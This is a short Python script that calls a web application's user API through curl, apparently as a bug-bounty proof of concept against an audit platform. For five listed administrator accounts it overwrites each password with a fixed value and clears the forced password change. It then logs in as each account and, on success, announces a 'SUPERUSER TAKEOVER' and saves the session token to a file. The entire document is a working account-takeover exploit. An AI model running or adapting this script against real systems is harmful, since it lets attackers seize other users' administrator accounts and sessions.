import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
PW="Zx9!su47b"
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or T),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
def login(email,pw):
    cmd=['curl','-s','-m','30','-o','/tmp/l','-w','%{http_code}','-X','POST',H+'/api/v1/users/login',
         '-H',BB,'-H','Content-Type: application/json','-d',json.dumps({"credentials":{"email":email,"password":pw}})]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/l',encoding='utf-8',errors='replace').read()
targets=[(186,'soxadmin1.xoblxfio@mailosaur.io'),(188,'tprm-admin@ab.com'),
         (190,'301e2493830.u1elhxrx@mailosaur.io'),(196,'analyst+triagers@bugcrowdanalyst.com'),
         (314,'analyst+superuser@bugcrowdanalyst.com')]
for uid,email in targets:
    c,b=req('PUT',f'/api/v1/users/{uid}',{"user":{"password":PW}})
    line=f"  {uid:3} {email[:42]:44} PUT={c}"
    if c=='200':
        req('PUT',f'/api/v1/users/{uid}',{"user":{"requires_password_change":False}})
        c2,b2=login(email,PW)
        line+=f" login={c2}"
        if c2=='200':
            s=json.loads(b2)['session']
            line+=f"  *** SUPERUSER TAKEOVER role={s['role_id']} ***"
            open('/tmp/su_tok','w').write(s['token'])
            open('/tmp/su_email','w').write(email)
        else:
            try: line+=" "+json.loads(b2).get('message','')[:40]
            except: pass
    print(line)
